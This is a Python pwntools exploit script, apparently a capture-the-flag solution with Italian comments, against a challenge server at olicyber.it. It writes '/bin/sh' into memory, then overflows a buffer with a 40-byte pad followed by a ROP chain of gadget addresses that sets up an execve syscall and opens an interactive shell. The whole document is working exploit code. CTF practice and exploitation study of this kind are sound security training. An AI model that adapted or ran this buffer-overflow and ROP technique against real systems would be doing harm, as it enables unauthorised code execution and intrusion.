from pwn import *

context(arch='amd64')

conn = remote('emergency.challs.olicyber.it', 10306)

chain = [
    0x0000000000401032,  #: pop rdi; ret; ==>  prendi rdi
    0x3b, # ==> execve, imposti rdi a 59
    0x0000000000401038, # xor rax, rdi ; ret ==> imposti rax a 59 facendo lo xor con rdi essendo rax = 0
    
    0x0000000000401032, # pop rdi ; ret ==  prendi rdi  
    0x0404000         , # const char *path

    0x0000000000401034, # pop rsi ; ret
	0x0               , # argv

	0x0000000000401036, # pop rdx ; ret
	0x0               , # envp

    0x000000000040101a
]

chain = flat(chain)
assert len(chain) <= 128 - 40

conn.sendafter(b'> ', b'/bin/sh') # -> 0x0404000

conn.sendafter(b'> ', b'A' * 40 + chain)

conn.interactive()
